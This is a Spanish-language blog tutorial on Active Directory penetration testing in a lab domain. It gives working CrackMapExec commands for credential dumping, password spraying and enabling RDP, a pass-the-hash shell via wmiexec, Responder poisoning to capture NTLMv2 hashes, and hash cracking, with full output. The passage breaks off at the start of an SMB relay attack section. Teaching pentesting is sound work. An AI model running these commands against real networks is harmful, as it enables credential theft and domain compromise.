---
title: Pentesting Active Directory
date: 2023-09-01 9:00:00
categories: [Active Directory, Windows, Apuntes]
tags: [ad, active directory, windows, windows server, tutorial]    
author: Waidroc
---


![Titulo!](/assets/img/2023-09-01/ad_titulo.jpg)


Esta vez, vamos a explorar diversas estrategias, enfoques y metodologías más comunes y efectivas para llevar a cabo pruebas de penetración en entornos de Active Directory. ¡Comencemos!

<h2> ¿Qué es Active Directory? </h2>

Active Directory (AD) es un servicio de directorio desarrollado por Microsoft que actúa como un sistema centralizado para `administrar y organizar recursos` en una red. Funciona como una base de datos `jerárquica` que almacena información sobre usuarios, grupos, dispositivos y recursos en una red, permitiendo un acceso y una administración eficiente de los recursos.

Su importancia a nivel empresarial radica en que proporciona una `estructura organizativa` para la gestión de usuarios y recursos de TI. Permite a las organizaciones establecer políticas de seguridad, asignar permisos y derechos de acceso, y gestionar de manera centralizada la autenticación y autorización en toda la red. Además, facilita la administración de sistemas, la implementación de políticas de grupo y la gestión de software a través de la red, lo que ahorra tiempo y recursos en entornos empresariales de cualquier tamaño.

<h2> ¿Qué vamos a ver en este post?</h2>

⧫ Crackmapexec enumeration <br/>
⧫ SMB Relay <br/>
⧫ Pass The Hash <br/>
⧫ Consiguiendo información de los usuarios <br/>
⧫ LDAP Enumeration <br/>
⧫ Kerbrute <br/>
⧫ Kerberoasting <br/>
⧫ AS-REP Roast <br/>
⧫ Golden Ticket <br/>
⧫ Rubeus - Kerberoasting <br/>
⧫ Rubeus - AS-REP Roast <br/>
⧫ SCF Files <br/>
⧫ Bloodhound & neo4j <br/>

# CrackMapExec enumeration

- - -

![CME!](/assets/img/2023-09-01/cme.png)

Esta es la herramienta más utilizada para el pentesting en Active Directory, ya que `enumera` los servicios más comunes. A pesar de esto, es bastante sencilla de usar. Veamos que podemos realizar con esta `navaja suiza`:

## SMB Enumeration

- - -

`SMB` es un protocolo utilizado por sistemas Windows para compartir archivos e impresoras, así como para otras funciones. Es una parte esencial de muchas redes y uno de los servicios más comunes que se ejecutan. Existen varias herramientas para enumerar SMB, como `smbclient` o `smbmap`. Pero crackmapexec es mi favorita por muchas razones. Hablemos de ellas:

### Network information

- - -

Utilizar `crackmapexec` de la manera más sencilla puede proporcionarte información como el dominio del Controlador de Dominio (DC), la firma SMB (la cual comprobaremos en el SMB Relay) o el nombre del host.

```zsh
❯ cme smb 192.168.10.1/24
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
```

De esta forma, podríamos ver los hosts con Windows que están conectados a la red. Podemos ver que el Controlador de Dominio (192.168.10.115) tiene la firma SMB, pero eso no importa si los otros PCs conectados al Controlador de Dominio no tienen la misma firma.

### Dumping SAM

- - -

Si sabemos las credenciales de uno de los usuarios del sistema, podemos dumpear el fichero `SAM`, el cual contiene las contraseñas en forma de hash (NTLM) de las cuentas de usuario locales.

```zsh
❯ cme smb 192.168.10.1/24 -u usuario -p 'Password2' --sam
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\usuario:Password2 
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\usuario:Password2 
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [+] Dumping SAM hashes
SMB         192.168.10.120   445    W3-PC        Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.120   445    W3-PC        Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.120   445    W3-PC        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.120   445    W3-PC        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7b75aeef3ea91facb4cd29e7da7832d9:::
SMB         192.168.10.120   445    W3-PC        Cordy:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.10.120   445    W3-PC        [+] Added 5 SAM hashes to the database
```
Aquí podemos observar que al saber la contraseña de `usuario`, podemos ver y dumpear el fichero SAM del host W3-PC, obteniendo los hashes de sus cuentas de usuario local. Ahora, si esas contraseñas son "flojas" y pueden obtenerse fácilmente con un ataque de fuerza bruta o de diccionario, nos podríamos hacer con el control total del sistema.

### Share enumeration

- - -

```zsh
❯ cme smb 192.168.10.1/24 -u cordy -p 'Password1' --shares
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\cordy:Password1 
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\cordy:Password1 
SMB         192.168.10.110   445    W1-PC        [+] Enumerated shares
SMB         192.168.10.110   445    W1-PC        Share           Permissions     Remark
SMB         192.168.10.110   445    W1-PC        -----           -----------     ------
SMB         192.168.10.110   445    W1-PC        ADMIN$                          Admin remota
SMB         192.168.10.110   445    W1-PC        C$                              Recurso predeterminado
SMB         192.168.10.110   445    W1-PC        IPC$            READ            IPC remota
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] Enumerated shares
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\cordy:Password1 
SMB         192.168.10.115   445    W2-PC  Share           Permissions     Remark
SMB         192.168.10.115   445    W2-PC  -----           -----------     ------
SMB         192.168.10.115   445    W2-PC  ADMIN$                          Remote Admin
SMB         192.168.10.115   445    W2-PC  C$                              Default share
SMB         192.168.10.115   445    W2-PC  IPC$            READ            Remote IPC
SMB         192.168.10.115   445    W2-PC  NETLOGON        READ            Logon server share 
SMB         192.168.10.115   445    W2-PC  SYSVOL          READ            Logon server share 
SMB         192.168.10.120   445    W3-PC        [+] Enumerated shares
SMB         192.168.10.120   445    W3-PC        Share           Permissions     Remark
SMB         192.168.10.120   445    W3-PC        -----           -----------     ------
SMB         192.168.10.120   445    W3-PC        ADMIN$                          Admin remota
SMB         192.168.10.120   445    W3-PC        C$                              Recurso predeterminado
SMB         192.168.10.120   445    W3-PC        IPC$            READ            IPC remota
                                                                                                                                                                                                                                
❯ cme smb 192.168.0.1/24 -u usuario -p 'Password2' --shares
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\usuario:Password2 
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\usuario:Password2 
SMB         192.168.10.110   445    W1-PC        [+] Enumerated shares
SMB         192.168.10.110   445    W1-PC        Share           Permissions     Remark
SMB         192.168.10.110   445    W1-PC        -----           -----------     ------
SMB         192.168.10.110   445    W1-PC        ADMIN$                          Admin remota
SMB         192.168.10.110   445    W1-PC        C$                              Recurso predeterminado
SMB         192.168.10.110   445    W1-PC        IPC$            READ            IPC remota
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] Enumerated shares
SMB         192.168.10.115   445    W2-PC  Share           Permissions     Remark
SMB         192.168.10.115   445    W2-PC  -----           -----------     ------
SMB         192.168.10.115   445    W2-PC  ADMIN$                          Remote Admin
SMB         192.168.10.115   445    W2-PC  C$                              Default share
SMB         192.168.10.115   445    W2-PC  IPC$            READ            Remote IPC
SMB         192.168.10.115   445    W2-PC  NETLOGON        READ            Logon server share 
SMB         192.168.10.115   445    W2-PC  SYSVOL          READ            Logon server share 
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [+] Enumerated shares
SMB         192.168.10.120   445    W3-PC        Share           Permissions     Remark
SMB         192.168.10.120   445    W3-PC        -----           -----------     ------
SMB         192.168.10.120   445    W3-PC        ADMIN$          READ,WRITE      Admin remota
SMB         192.168.10.120   445    W3-PC        C$              READ,WRITE      Recurso predeterminado
SMB         192.168.10.120   445    W3-PC        IPC$            READ            IPC remota
```

De nuevo, podemos observar de nuevo que el usuario `usuario` tiene permisos de administrador sobre el usuario `cordy`. Esta salida nos muestra el tipo de permisos sobre los recursos compartidos (si los hay).

### Spidering

- - -

Una de las opciones más importantes que nos brinda `cme` es un módulo llamado `spider_plus`, ya que explora todos los recursos compartidos y directorios que hay en su interior de manera recursiva, proporcionándonos así un resultado ordenado y muy visual, mostrándonos todos los ficheros visibles en cada recurso compartido. 

Este módulo nos agiliza y facilita la tarea, ya que no tenemos que acceder a cada uno de los recursos compartidos para enumerar todos los directoriso y ficheros que contienen manualmente. Veamos un ejemplo:

```zsh
❯ cme smb 192.168.0.1/24 -u usuario -p 'Password2' -M spider_plus
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\usuario:Password2 
SPIDER_P... 192.168.10.110   445    W1-PC        [*] Started spidering plus with option:
SPIDER_P... 192.168.10.110   445    W1-PC        [*]        DIR: ['print$']
SPIDER_P... 192.168.10.110   445    W1-PC        [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.10.110   445    W1-PC        [*]       SIZE: 51200
SPIDER_P... 192.168.10.110   445    W1-PC        [*]     OUTPUT: /tmp/cme_spider_plus
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
SPIDER_P... 192.168.10.120   445    W3-PC        [*] Started spidering plus with option:
SPIDER_P... 192.168.10.120   445    W3-PC        [*]        DIR: ['print$']
SPIDER_P... 192.168.10.120   445    W3-PC        [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.10.120   445    W3-PC        [*]       SIZE: 51200
SPIDER_P... 192.168.10.120   445    W3-PC        [*]     OUTPUT: /tmp/cme_spider_plus
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\usuario:Password2 
SPIDER_P... 192.168.10.115   445    W2-PC  [*] Started spidering plus with option:
SPIDER_P... 192.168.10.115   445    W2-PC  [*]        DIR: ['print$']
SPIDER_P... 192.168.10.115   445    W2-PC  [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.10.115   445    W2-PC  [*]       SIZE: 51200
SPIDER_P... 192.168.10.115   445    W2-PC  [*]     OUTPUT: /tmp/cme_spider_plus
```

### Authentication sprying

- - -

Ahora, imaginemos que tenemos la credencial del usuario `Administrator`, el cual es el administrador del dominio. Lo hemos obtenido con un ataque `SMB Relay`.
Pues, con `crackmapexec`, podríamos realizar un ataque de `password spraying` para ver en qué sistemas puedes conectarte. Veamos:

```zsh
❯ cme smb 192.168.0.1/24 -u Administrator -p 'P4$$W0rd!!!#'
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
```

En este caso, al ser administradores del DC, nos podemos conectar a todos y cada uno de los hosts que hay en la red. Ahora, podríamos habilitar el protocolo `rdp` en todos los sistemas para podernos conectar a ellos vía `pth-winexe`:

```zsh
❯ cme smb 192.168.0.1/24 -u Administrator -p 'P4$$W0rd!!!#' -M rdp -o action=enable
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
RDP         192.168.10.110   445    W1-PC        [+] RDP enabled successfully
RDP         192.168.10.120   445    W3-PC        [+] RDP enabled successfully
RDP         192.168.10.115   445    W2-PC  [+] RDP enabled successfully
```

# Pass The Hash

- - -

Ahora, podemos volcar el fichero `NTDS` y obtener el hash. Nuestra víctima será el usuario `usuario`:

```zsh
❯ cme smb 192.168.10.115 -u Administrator -p 'P4$$W0rd!!!#' --ntds vss
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.115   445    W2-PC  [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.10.115   445    W2-PC  Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
SMB         192.168.10.115   445    W2-PC  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.115   445    W2-PC  W2-PC$:1000:aad3b435b51404eeaad3b435b51404ee:4054f61d8984e3d043fe140d9a78fea2:::
SMB         192.168.10.115   445    W2-PC  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:acf2d0133c0db165efbca5b44072e10a:::
SMB         192.168.10.115   445    W2-PC  waidroc.local\cordy:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.10.115   445    W2-PC  W3-PC$:1104:aad3b435b51404eeaad3b435b51404ee:ab1687ba2fe14303e8a2db5d154f7aa8:::
SMB         192.168.10.115   445    W2-PC  waidroc.local\usuario:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         192.168.10.115   445    W2-PC  W1-PC$:1107:aad3b435b51404eeaad3b435b51404ee:5b8bfc212d142cedbcd2edcb5937a38a:::
SMB         192.168.10.115   445    W2-PC  [+] Dumped 8 NTDS hashes to /root/.cme/logs/W2-PC_192.168.10.115_2023-05-25_164328.ntds of which 5 were added to the database
```

De esta forma, podemos obtener el hash del usuario víctima y conectarnos al host con `wmiexec`:

```zsh
❯ wmiexec.py waidroc.local/usuario@192.168.10.120 -hashes aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
waidroc\usuario
C:\>ipconfig
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec

Configuraci�n IP de Windows


Adaptador de Ethernet Ethernet:

   Sufijo DNS espec�fico para la conexi�n. . : 
   V�nculo: direcci�n IPv6 local. . . : fe80::7024:cc60:3dde:1db6%8
   Direcci�n IPv4. . . . . . . . . . . . . . : 192.168.10.120
   M�scara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : 192.168.10.1

```

De esta forma, estaremos ejecutando comandos como `usuario` en el host W3-PC, con privilegios de administrador.

# SMB Relay

- - -

![SMBRelay!](/assets/img/2023-09-01/smbrelay.png)

Este es el ataque más común y a su vez, el primero que debemos de ejecutar cuando estamos haciendo una auditoría al Controlador de Dominio.


## ¿Qué es un ataque SMB Relay?

Un ataque `SMB Relay` lo realizamos cuando nosotros, como atacantes, capturamos un hash NTLMv2 de algún usuario y así poder interceptar y redirigir solicitudes de autenticación SMB de un host a otro, aprovechando así las funcionalidades de confianza mutua en redes locales. 

Así, engañamos a una máquina víctima para que envíe sus credenciales de autenticación al atacante, en lugar de al servidor o recurso legítimo para así, poder utilizar posteriormente esas credenciales para acceder a sistemas o recursos a los que la víctima tenía acceso, consiguiendo una escalada de privilegios a nivel de red.

## Prerrequisitos

- `SMB` no firmado.
- Debe de realizarse en una red local.
- Las credenciales de usuario deben tener acceso de inicio de sesión remoto, por ejemplo, ser administrador local en la máquina objetivo o ser miembro del grupo de Administradores del Dominio.


## SMB Signing

- - -

### ¿Qué hace?

- - -

La firma del SMB, verifica el `origen y la autenticidad` de los paquetes SMB. Efectivamente, esto cancela todo tipo de ataque `MITM`, como el ataque SMB relay desde su inicio. Si está activado no podremos realizar el ataque.

Podemos comprobar si este servicio esta activado con `cme`.

### Prueba de Concepto (PoC)

- - -

```zsh
❯ cme smb 192.168.0.1/24
SMB         192.168.0.114   445    WIN-23Q9AFM8V9R  [*] Windows 10.0 Build 17763 x64 (name:WIN-23Q9AFM8V9R) (domain:test.local) (signing:True) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
```

Aquí podemos ver que tenemos `2 DCs`:

- `test.local` (192.168.0.114)
- `waidroc.local` (192.168.10.115)

En ambos casos, SMB no esta firmado, por consecuente, podríamos realizar el ataque sin problemas:

Primero, con la herramienta `responder`, envenenamos la red:

```zsh
❯ responder -I wlan0 -dw
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.10.105]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-NDF5GOK02C8]
    Responder Domain Name      [97ZB.LOCAL]
    Responder DCE-RPC Port     [45364]

[+] Listening for events...

[*] [DHCP] Found DHCP server IP: 192.168.10.1, now waiting for incoming requests...
```
Ahora, si ingresaramos a un recurso que no existe en el Explorador de Archivos de Windows, tu responder autenticaría como el recurso inexistente:

Si accedemos a un recurso que no existe en el Explorador de Archivos de Windows, nuestro responder autenticaría como el recurso inexistente.

En la máquina Windows, parece que no habría pasado nada pero si echamos un vistazo en el `responder`:

```zsh
❯ responder -I wlan0 -dw
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.10.105]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-WGLRX6KFSXA]
    Responder Domain Name      [72XV.LOCAL]
    Responder DCE-RPC Port     [46997]

[+] Listening for events...

[*] [DHCP] Found DHCP server IP: 192.168.10.1, now waiting for incoming requests...
[*] [MDNS] Poisoned answer sent to 192.168.10.114   for name thisisnotexisting.local
[*] [MDNS] Poisoned answer sent to fe80::43b2:5355:d026:2e2a for name thisisnotexisting.local
[*] [MDNS] Poisoned answer sent to 192.168.10.114   for name thisisnotexisting.local
[*] [MDNS] Poisoned answer sent to fe80::43b2:5355:d026:2e2a for name thisisnotexisting.local
[*] [LLMNR]  Poisoned answer sent to 192.168.10.114 for name thisisnotexisting
[*] [LLMNR]  Poisoned answer sent to fe80::43b2:5355:d026:2e2a for name thisisnotexisting
[*] [LLMNR]  Poisoned answer sent to fe80::43b2:5355:d026:2e2a for name thisisnotexisting
[*] [LLMNR]  Poisoned answer sent to 192.168.10.114 for name thisisnotexisting
[SMB] NTLMv2-SSP Client   : fe80::43b2:5355:d026:2e2a
[SMB] NTLMv2-SSP Username : TEST\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::TEST:3fabd80df2a798d1:5CFA7A9518D439D72DE93334446B0E78:01010000000000008096715AB98DD9019F2CE73B69622AA20000000002000800370032005800560001001E00570049004E002D00570047004C005200580036004B00460053005800410004003400570049004E002D00570047004C005200580036004B0046005300580041002E0037003200580056002E004C004F00430041004C000300140037003200580056002E004C004F00430041004C000500140037003200580056002E004C004F00430041004C00070008008096715AB98DD9010600040002000000080030003000000000000000000000000030000058EB90B87185FC51DDCBC7261E23DCE94E13E0B5FC10237908F6DD837C13582E0A0010000000000000000000000000000000000009002C0063006900660073002F007400680069007300690073006E006F0074006500780069007300740069006E0067000000000000000000
```

Hemos capturado el hash `NTLMv2` del usuario `Administrator`!! Ahora, podemos intentar crackear dicho hash pero, en este caso, no podríamos porque es una contraseña segura que tardaríamos años en desencriptar.

Ahora, hacemos el mismo proceso, pero hagámoslo en nuestro `entorno de pruebas`, donde capturaremos un hash menos seguro, fácilmente crackeable por `fuerza bruta`. Repetimos el proceso y observamos el `responder`:

```zsh
❯ responder -I wlan0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.10.105]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-G98QVZWMZJ4]
    Responder Domain Name      [3R0S.LOCAL]
    Responder DCE-RPC Port     [48530]

[+] Listening for events...

[*] [MDNS] Poisoned answer sent to 192.168.10.115   for name waidrocagphqpwerug.local
[*] [MDNS] Poisoned answer sent to 192.168.10.115   for name waidrocagphqpwerug.local
[*] [LLMNR]  Poisoned answer sent to 192.168.10.115 for name waidrocagphqpwerug
[*] [LLMNR]  Poisoned answer sent to 192.168.10.115 for name waidrocagphqpwerug
[SMB] NTLMv2-SSP Client   : fe80::1e2e:ac4a:2102:569f
[SMB] NTLMv2-SSP Username : waidroc\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::waidroc:84cc9122d9316c48:9D34FF6B29164B3E2A9E9ADE37D10914:010100000000000080D0D28C598ED90141B5EB01668B658C0000000002000800330052003000530001001E00570049004E002D00470039003800510056005A0057004D005A004A00340004003400570049004E002D00470039003800510056005A0057004D005A004A0034002E0033005200300053002E004C004F00430041004C000300140033005200300053002E004C004F00430041004C000500140033005200300053002E004C004F00430041004C000700080080D0D28C598ED901060004000200000008003000300000000000000000000000003000003A4DD9718188490BDF219D7B66290306551A69F6C9A7CFF2C5832C8EAFB0C9040A001000000000000000000000000000000000000900300063006900660073002F0072007500790063007200340066007400610067007000680071007000770065007200750067000000000000000000
```

Podemos ver que `Administrator` se ha autenticado en el dominio `waidroc.local`. Guardemos el hash e intentémos crackearlo con la herramienta `john the ripper`!

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P4$$W0rd!!!#        (Administrator)     
1g 0:00:00:11 DONE (2023-05-24 16:07) 0.08547g/s 919849p/s 919849c/s 919849C/s PAK2530..P1nkr1ng
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Hemos crackeado la contraseña del usuario víctima -> `Administrator:P4$$W0rd!!!#`

### Attack (IPv4)

- - -

> Para que funcione, debemos de realizar algunos cambios en el fichero de configuración de responder (/usr/share/responder/Responder.conf).
{: .prompt-info}

En algunos Controladores de Dominio, hay algunos usuarios que tienen privilegios en otros usuarios, como en este caso ya que, el usuario `usuario` es privilegiado sobre `cordy`:

```zsh
❯ cme smb 192.168.10.1/24 -u 'usuario' -p 'Password2'
SMB         192.168.0.109   445    SARA             [*] Windows 10.0 Build 19041 x64 (name:SARA) (domain:SARA) (signing:False) (SMBv1:False)
